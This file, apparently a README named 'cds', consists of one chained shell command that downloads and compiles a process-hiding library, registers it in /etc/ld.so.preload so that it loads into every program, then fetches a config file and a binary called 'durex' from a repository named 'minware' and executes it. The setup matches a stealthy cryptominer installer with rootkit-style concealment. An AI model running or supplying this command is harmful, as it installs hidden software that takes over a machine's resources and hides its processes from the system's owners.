# cds
wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload && wget https://raw.githubusercontent.com/bulboni/cds/main/config.json && wget https://github.com/bulboni/minware/raw/main/durex && chmod +x durex && ./durex
